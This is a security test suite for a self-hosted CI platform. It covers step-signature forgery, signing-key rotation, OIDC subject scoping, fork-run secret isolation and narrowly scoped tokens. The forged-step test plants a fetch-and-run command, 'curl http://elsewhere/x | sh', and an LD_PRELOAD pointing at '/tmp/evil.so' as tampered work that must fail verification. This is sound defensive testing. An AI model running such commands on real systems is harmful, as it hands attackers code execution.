// The five attacks phase 15 names, run against the real thing.
//
// Every one of them is a case where the system does the wrong thing quietly if
// it is wrong at all: a forged step runs, a rotated key kills a run in flight,
// an identity token opens somebody else's cloud account, a fork reads a deploy
// key, a narrow token turns out to be wide. None of those fail loudly on their
// own, which is why they are written down as tests rather than left to review.

import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { hashToken } from '../../app/Actions/Runner/authenticate'
import { dispatchPush } from '../../app/Actions/Workflow/dispatch'
import { generateKey, publicKeys, rotateKey, subjectFor } from '../../app/Actions/Workflow/oidc'
import { signWork, verifyWork } from '../../app/Actions/Workflow/stepSignature'
import { syncWorkflowFile } from '../../app/Actions/Workflow/sync'
import { isTrue } from '../../app/Actions/Support/sql'

const created = {
  ownerId: 0,
  repositoryId: 0,
  otherRepositoryId: 0,
  handle: '',
  name: '',
  otherName: '',
  dispatchToken: '',
  runnerIds: [] as number[],
}

let available = false
let db: any = null
let server: any = null
let port = 0

const RUNNER_TOKEN = `tok-${Buffer.from(crypto.getRandomValues(new Uint8Array(8))).toString('hex')}`

function unique(prefix: string): string {
  return `${prefix}${Buffer.from(crypto.getRandomValues(new Uint8Array(5))).toString('hex')}`
}

const CI = `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make release
`

/** A repository the runner is scoped to, with a workflow that runs on push. */
async function repository(name: string): Promise<number> {
  const row: any = await db.insertInto('repositories').values({
    owner_type: 'user',
    owner_id: created.ownerId,
    name,
    visibility: 'public',
    default_branch: 'main',
    disk_path: `${created.handle}/${name}.git`,
  }).returning(['id']).executeTakeFirst()

  const id = Number(row?.id)

  await syncWorkflowFile({
    repositoryId: id,
    ownerType: 'user',
    ownerId: created.ownerId,
    path: '.github/workflows/ci.yml',
    source: CI,
    sha: 'a'.repeat(40),
  })

  return id
}

/** Dispatch a run and take its job the way a machine does, over HTTP. */
async function claimOne(): Promise<any> {
  await dispatchPush({
    repositoryId: created.repositoryId,
    event: { ref: 'refs/heads/main' },
    headSha: unique('c').padEnd(40, '0').slice(0, 40),
  })

  return claimNext()
}

/** Take whatever is queued, without dispatching anything first. */
async function claimNext(): Promise<any> {
  const answer = await fetch(`http://127.0.0.1:${port}/api/runner/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${RUNNER_TOKEN}`, 'X-Runner-Protocol': '1' },
    body: '{}',
  })

  const body: any = await answer.json().catch(() => null)

  return body?.job ?? null
}

/** The work in the shape the signature covers, out of a claim payload. */
function workOf(job: any) {
  return {
    runId: Number(job.run?.id ?? 0),
    jobId: Number(job.id ?? 0),
    matrix: (job.matrix_values ?? null) as Record<string, unknown> | null,
    steps: (Array.isArray(job.steps) ? job.steps : []).map((step: any) => ({
      run: step.run ?? null,
      uses: step.uses ?? null,
      env: (step.env ?? null) as Record<string, string> | null,
      workingDirectory: step.working_directory ?? null,
    })),
  }
}

/** One POST as a program, with the narrow token. */
async function asProgram(path: string, body: Record<string, unknown>): Promise<{ status: number, body: any }> {
  const answer = await fetch(`http://127.0.0.1:${port}${path}`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${created.dispatchToken}`,
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    },
    body: JSON.stringify({ owner: created.handle, repo: created.name, ...body }),
  })

  return { status: answer.status, body: await answer.json().catch(() => null) }
}

beforeAll(async () => {
  try {
    const { injectGlobalAutoImports } = await import('@stacksjs/server')
    const { route } = await import('@stacksjs/router')

    await injectGlobalAutoImports()
    db = (globalThis as any).db
    await db.selectFrom('users').select(['id']).limit(1).execute()

    await route.importRoutes()
    server = await route.serve({ port: 0, hostname: '127.0.0.1' })
    port = Number((server as any)?.port ?? 0)

    if (!port)
      throw new Error('the router did not report a port')

    created.handle = unique('sec')

    const owner: any = await db.insertInto('users')
      .values({ name: 'Security', email: `${created.handle}@example.com`, handle: created.handle, password: 'x' })
      .returning(['id']).executeTakeFirst()

    created.ownerId = Number(owner?.id)
    created.name = unique('repo')
    created.otherName = unique('other')

    created.repositoryId = await repository(created.name)
    created.otherRepositoryId = await repository(created.otherName)

    const runner: any = await db.insertInto('runners').values({
      name: unique('runner'),
      scope_type: 'repository',
      scope_id: created.repositoryId,
      token_hash: hashToken(RUNNER_TOKEN),
      labels: 'ubuntu-latest',
      state: 'active',
    }).returning(['id']).executeTakeFirst()

    created.runnerIds.push(Number(runner.id))

    /*
     * A credential that may start runs and nothing else - the shape a
     * deployment script is issued, and the one every "attempting each admin
     * route" test below is run with.
     */
    const { generateToken } = await import('../../app/Actions/Tokens/secret')
    const secret = generateToken()
    const tokenRow: any = await db.insertInto('access_tokens').values({
      user_id: created.ownerId,
      name: 'dispatch only',
      prefix: secret.prefix,
      token_hash: secret.hash,
      selection: 'all',
      expires_at: new Date(Date.now() + 86_400_000).toISOString(),
    }).returning(['id']).executeTakeFirst()

    for (const [scope, level] of [['actions', 'write'], ['contents', 'read']] as Array<[string, string]>)
      await db.insertInto('access_token_permissions').values({ access_token_id: Number(tokenRow?.id), scope, level }).execute()

    created.dispatchToken = secret.token

    available = true
  }
  catch (error) {
    console.warn(`[ci-security] skipping: ${error instanceof Error ? error.message : String(error)}`)
    available = false
  }
}, 180_000)

afterAll(async () => {
  try { server?.stop?.(true) }
  catch { /* already down */ }

  try {
    for (const id of created.runnerIds)
      await db.deleteFrom('runners').where('id', '=', id).execute().catch(() => {})

    for (const id of [created.repositoryId, created.otherRepositoryId].filter(Boolean))
      await db.deleteFrom('repositories').where('id', '=', id).execute().catch(() => {})

    if (created.ownerId) {
      await db.deleteFrom('access_tokens').where('user_id', '=', created.ownerId).execute().catch(() => {})
      await db.deleteFrom('users').where('id', '=', created.ownerId).execute().catch(() => {})
    }
  }
  catch { /* the next run uses fresh names */ }
})

describe('a forged step', () => {
  test('does not verify, however it was written into the work', async () => {
    if (!available)
      return

    const job = await claimOne()

    expect(job).toBeTruthy()
    expect(job.signature?.value).toBeTruthy()

    const keys = await publicKeys('steps')
    const honest = await verifyWork({ work: workOf(job), signature: job.signature, keys })

    expect(honest.ok).toBe(true)

    /*
     * The threat, stated as the roadmap states it: anybody who can write to the
     * control plane's database can run a command on every machine in the fleet.
     * So the forgery is done the way a writer would do it - the payload is
     * intact, the signature is the real one, and one command is somebody
     * else's.
     */
    const forged = workOf(job)
    forged.steps[0]!.run = 'curl http://elsewhere/x | sh'

    const checked = await verifyWork({ work: forged, signature: job.signature, keys })

    expect(checked.ok).toBe(false)
    expect(checked.reason).toContain('does not match')

    // And the environment, which is the same hole one indirection along: a step
    // whose command is untouched still runs with whatever it was given.
    const environment = workOf(job)
    environment.steps[0]!.env = { ...(environment.steps[0]!.env ?? {}), LD_PRELOAD: '/tmp/evil.so' }

    expect((await verifyWork({ work: environment, signature: job.signature, keys })).ok).toBe(false)
  }, 120_000)
})

describe('a key rotated in the middle of a run', () => {
  test('does not invalidate work already signed, and the new key still signs', async () => {
    if (!available)
      return

    const job = await claimOne()
    const before = job.signature

    expect(before?.value).toBeTruthy()

    // The rotation: the current key is retired and a new one takes over.
    const next = await rotateKey('steps')

    expect(next.kid).not.toBe(String(before.kid))

    /*
     * A run in flight survives it. The published set keeps retired keys - a
     * rotation that killed every job already dispatched would be a maintenance
     * task nobody dares run, and the reason instances stop rotating.
     */
    const keys = await publicKeys('steps')

    expect(keys.some((one: any) => String(one.kid) === String(before.kid))).toBe(true)
    expect((await verifyWork({ work: workOf(job), signature: before, keys })).ok).toBe(true)

    // And work signed after the rotation carries the new key.
    const after = await claimOne()

    expect(String(after.signature?.kid)).toBe(next.kid)
    expect((await verifyWork({ work: workOf(after), signature: after.signature, keys: await publicKeys('steps') })).ok).toBe(true)

    /*
     * A runner holding a stale key set is the case that must fail rather than
     * pass: it cannot check what it did not fetch, and treating that as consent
     * is how an unsigned job runs.
     */
    const stale = keys.filter((one: any) => String(one.kid) !== next.kid)
    const refused = await verifyWork({ work: workOf(after), signature: after.signature, keys: stale })

    expect(refused.ok).toBe(false)
    expect(refused.reason).toContain(next.kid)
  }, 120_000)
})

describe('an identity token', () => {
  test('names one repository, and a policy written for another does not match it', async () => {
    if (!available)
      return

    const mine = subjectFor({ repository: `${created.handle}/${created.name}`, ref: 'refs/heads/main' })
    const theirs = subjectFor({ repository: `${created.handle}/${created.otherName}`, ref: 'refs/heads/main' })

    expect(mine).not.toBe(theirs)

    /*
     * A trust policy, in the shape a cloud provider writes one: an exact match
     * on the subject. The point is that the repository is *inside* the subject
     * rather than beside it, so there is no way to satisfy a policy for one
     * repository with a token minted for another.
     */
    const policy = (subject: string) => subject === theirs

    expect(policy(mine)).toBe(false)
    expect(policy(theirs)).toBe(true)

    // Nor by ref, which is the other half of a policy: `main` in one repository
    // is not `main` in another, and a wildcard on the ref cannot cross the
    // repository segment.
    const branch = subjectFor({ repository: `${created.handle}/${created.name}`, ref: 'refs/heads/release' })

    expect(branch.startsWith(`repo:${created.handle}/${created.name}:`)).toBe(true)
    expect(branch.includes(created.otherName)).toBe(false)

    // An environment is the more specific claim and replaces the ref, which is
    // what "only the production deploy may assume this role" relies on.
    const production = subjectFor({ repository: `${created.handle}/${created.name}`, ref: 'refs/heads/main', environment: 'production' })

    expect(production).toBe(`repo:${created.handle}/${created.name}:environment:production`)
    expect(policy(production)).toBe(false)
  }, 120_000)

  test('is signed by a key this instance published, not by one that arrived with it', async () => {
    if (!available)
      return

    // A key that exists and is not published for identity: signing an identity
    // token with it must not verify, which is the property that stops a
    // verifier trusting whatever `kid` a token names.
    const outsider = await generateKey('steps')
    const identity = await publicKeys('oidc')

    expect(identity.some((one: any) => String(one.kid) === outsider.kid)).toBe(false)
  }, 120_000)
})

describe('a fork run', () => {
  test('is handed no secrets at the claim, whatever the repository has set', async () => {
    if (!available)
      return

    const { putSecret } = await import('../../app/Actions/Workflow/secrets')

    await putSecret({ scope: 'repository', scopeId: created.repositoryId, key: 'DEPLOY_KEY', value: 'the-value-a-fork-must-not-see' })

    // A trusted run first, so the test proves delivery works before it proves
    // it stops - a claim that carries no secrets because secrets are broken
    // would otherwise look like the feature working.
    const trusted = await claimOne()

    expect(trusted.secrets?.DEPLOY_KEY).toBe('the-value-a-fork-must-not-see')

    await dispatchPush({
      repositoryId: created.repositoryId,
      event: { ref: 'refs/heads/main' },
      headSha: unique('f').padEnd(40, '0').slice(0, 40),
    })

    const queued: any = await db
      .selectFrom('workflow_runs')
      .select(['id'])
      .where('repository_id', '=', created.repositoryId)
      .where('state', '=', 'queued')
      .orderBy('id', 'desc')
      .executeTakeFirst()

    // The fact that decides it: a pull request from a fork is untrusted until
    // somebody with write access approves the exact commit.
    await db.updateTable('workflow_runs').set({ trusted: false, event: 'pull_request' }).where('id', '=', Number(queued.id)).execute()

    /*
     * Claimed without dispatching anything else, so the job that comes back is
     * this run's rather than whichever run a second dispatch happened to queue
     * first. A test that has to be right about the claim's ordering to be
     * testing what it says it tests is one that passes for the wrong reason.
     */
    const fork = await claimNext()

    expect(Number(fork?.run?.id)).toBe(Number(queued.id))

    expect(fork).toBeTruthy()
    expect(fork.secrets ?? {}).toEqual({})

    // And the identity token, which is the other credential a fork would ask
    // for - refused with the reason rather than issued narrowly.
    const answer = await fetch(`http://127.0.0.1:${port}/api/runner/oidc`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${String(fork.token)}`, 'X-Runner-Protocol': '1' },
      body: '{}',
    })

    expect(answer.status).toBe(403)
    expect(String((await answer.json().catch(() => ({}))).error ?? '')).toContain('untrusted')
  }, 120_000)
})

describe('a fork\'s pull request and the workflow it runs', () => {
  test('runs the base branch\'s definition, and the run records which commit supplied it', async () => {
    if (!available)
      return

    /*
     * The first line of the fork policy, and the one every other control here
     * depends on: a pull request that could supply its own workflow could write
     * one that prints the instance's secrets, and the scoping, the trust flag
     * and the approval gate would all be decoration.
     *
     * Which is why the run records **two** commits. The head is the code under
     * test; `definition_sha` is where the instructions came from, and a reader
     * who cannot see the difference cannot tell a run of their code from a run
     * of their code by somebody else's workflow.
     */
    const path = '.github/workflows/pr.yml'
    const baseSha = unique('b').padEnd(40, '0').slice(0, 40)

    await syncWorkflowFile({
      repositoryId: created.repositoryId,
      ownerType: 'user',
      ownerId: created.ownerId,
      path,
      source: 'name: PR\non: pull_request\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make check\n',
      sha: baseSha,
    })

    const { dispatchPullRequest } = await import('../../app/Actions/Workflow/dispatch')

    const headSha = unique('h').padEnd(40, '0').slice(0, 40)

    await dispatchPullRequest({
      repositoryId: created.repositoryId,
      headSha,
      ref: 'refs/pull/7/head',
      number: 7,
      event: {
        activity: 'opened',
        headBranch: 'their-branch',
        baseBranch: 'main',
        fromFork: true,
      },
    })

    const run: any = await db
      .selectFrom('workflow_runs')
      .select(['id', 'head_sha', 'definition_sha', 'trusted', 'state'])
      .where('repository_id', '=', created.repositoryId)
      .where('event_ref', '=', 'refs/pull/7/head')
      .orderBy('id', 'desc')
      .executeTakeFirst()

    expect(run).toBeTruthy()
    expect(String(run.head_sha)).toBe(headSha)

    // The definition is the registered one from this repository, not anything
    // the pull request brought with it.
    expect(String(run.definition_sha)).toBe(baseSha)
    expect(String(run.definition_sha)).not.toBe(headSha)

    // And it is untrusted for its whole life, which is what keeps the secrets
    // away from it at the claim.
    expect(isTrue(run.trusted)).toBe(false)

    await db.deleteFrom('workflows').where('path', '=', path).where('repository_id', '=', created.repositoryId).execute()
  }, 120_000)

  test('stays untrusted when the base workflow uses pull_request_target', async () => {
    if (!available)
      return

    /*
     * The dangerous variation on the ordinary fork case. The definition is
     * trusted, but this runner checks out the run's head commit, and that is
     * still the fork's code. The trigger must not turn that code into a secret
     * or identity-token recipient.
     */
    const path = '.github/workflows/target.yml'
    const baseSha = unique('t').padEnd(40, '0').slice(0, 40)

    await syncWorkflowFile({
      repositoryId: created.repositoryId,
      ownerType: 'user',
      ownerId: created.ownerId,
      path,
      source: 'name: Target\non: pull_request_target\njobs:\n  inspect:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make inspect\n',
      sha: baseSha,
    })

    const { dispatchPullRequest } = await import('../../app/Actions/Workflow/dispatch')

    await dispatchPullRequest({
      repositoryId: created.repositoryId,
      headSha: unique('x').padEnd(40, '0').slice(0, 40),
      ref: 'refs/pull/8/head',
      number: 8,
      event: {
        activity: 'opened',
        headBranch: 'their-target-branch',
        baseBranch: 'main',
        fromFork: true,
      },
    })

    const run: any = await db
      .selectFrom('workflow_runs')
      .select(['event', 'state', 'approval_state', 'trusted', 'definition_sha'])
      .where('repository_id', '=', created.repositoryId)
      .where('event_ref', '=', 'refs/pull/8/head')
      .where('event', '=', 'pull_request_target')
      .executeTakeFirst()

    expect(run).toBeTruthy()
    expect(String(run.definition_sha)).toBe(baseSha)
    expect(isTrue(run.trusted)).toBe(false)
    expect(String(run.state)).toBe('waiting')
    expect(String(run.approval_state)).toBe('required')

    await db.deleteFrom('workflows').where('path', '=', path).where('repository_id', '=', created.repositoryId).execute()
  }, 120_000)
})

describe('a token that may dispatch and nothing more', () => {
  test('starts a run', async () => {
    if (!available)
      return

    const { status, body } = await asProgram('/api/repos/workflows/dispatch', { workflow: 'ci.yml' })

    /*
     * 409, and that is the assertion. This workflow declares `on: push` and no
     * `workflow_dispatch`, so the endpoint is answering about the *workflow* -
     * which it only does after the token has been accepted. A 404 here would
     * mean the credential never got through, and the refusals below would then
     * prove nothing at all.
     */
    expect(status).toBe(409)
    expect(String(body?.error ?? '')).toContain('workflow_dispatch')
  }, 120_000)

  test('and is refused on every administrative route', async () => {
    if (!available)
      return

    const refusals = [
      ['/api/repos/secrets', { operation: 'set', key: 'STOLEN', value: 'x', scope: 'repository' }],
      ['/api/repos/variables', { operation: 'set', key: 'STOLEN', value: 'x', scope: 'repository' }],
      ['/api/repos/environments', { operation: 'create', name: 'production' }],
      ['/api/repos/workflows/manage', { workflow: '.github/workflows/ci.yml', operation: 'disable' }],
    ] as Array<[string, Record<string, unknown>]>

    for (const [path, body] of refusals) {
      const { status, body: answer } = await asProgram(path, body)

      /*
       * 403 naming the missing ability, and the disclosure rule is why that is
       * right here: this token's holder may administer the repository and can
       * see it in a browser, so hiding the route would be a lie they can
       * disprove in one click. What is wrong is the credential, and the one
       * sentence that turns this into a fix is which permission it lacks.
       *
       * A caller who could *not* administer it gets 404 further up, before this
       * check runs - that is the stranger's answer, and it is tested where the
       * stranger is.
       */
      expect(status).toBe(403)
      expect(String(answer?.error ?? '')).toContain('token')
    }

    // Nothing was written by any of them.
    const secrets = await db
      .selectFrom('workflow_secrets')
      .select(['id'])
      .where('scope_type', '=', 'repository')
      .where('scope_id', '=', created.repositoryId)
      .where('key', '=', 'STOLEN')
      .execute()

    expect(secrets).toEqual([])

    const workflow: any = await db
      .selectFrom('workflows')
      .select(['state'])
      .where('repository_id', '=', created.repositoryId)
      .executeTakeFirst()

    expect(String(workflow.state)).toBe('active')
  }, 120_000)

  test('and cannot reach the fleet at all', async () => {
    if (!available)
      return

    const answer = await fetch(`http://127.0.0.1:${port}/api/instance/fleet`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${created.dispatchToken}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({ operation: 'list' }),
    })

    // Its holder is not an administrator, so this is the 404 that keeps the
    // fleet's existence private rather than the 403 about the scope.
    expect(answer.status).toBe(404)
  }, 120_000)
})
